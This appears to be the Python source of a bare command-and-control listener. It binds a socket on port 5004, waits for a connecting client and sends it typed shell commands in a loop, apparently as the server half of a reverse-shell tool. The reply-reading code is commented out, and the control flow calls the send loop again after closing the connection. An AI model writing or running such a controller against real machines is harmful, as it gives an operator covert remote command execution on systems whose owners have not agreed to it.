import socket
import subprocess
import sys


# create the socket
def sock_create():
    try:
        global host
        global port
        global buffsize
        global s
        host = socket.gethostbyname(socket.gethostname())
        port = 5004
        buffsize = 256
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as emsg:
        print(f"[-] Failed to create socket: {emsg}")


# bind socket
def bind_sock():
    try:
        print(f"[+] Binding socket: {host}:{port}")
        s.bind((host, port))
        s.listen(5)
    except socket.error as emsg:
        print(f'[-] Sock bind failed: {emsg}\n[+] Retrying...')
        bind_sock()


# accept socket
def socket_accept():
    global conn, address
    conn, address = s.accept()
    print(f'[NEW CONN] New connection from IP: {address[0]} | Port: {address[1]}')
    send_commands()
    conn.close()


def send_commands():
    while True:
        command = input(f">>").lower()
        if not command.strip():
            # empty command
            continue
            # send the command to the client
        conn.send(command.encode())

        # output = conn.recv(buffsize).decode()
        # print(output, end="")


def main():
    sock_create()
    bind_sock()
    socket_accept()
    send_commands()


if __name__ == '__main__':
    main()
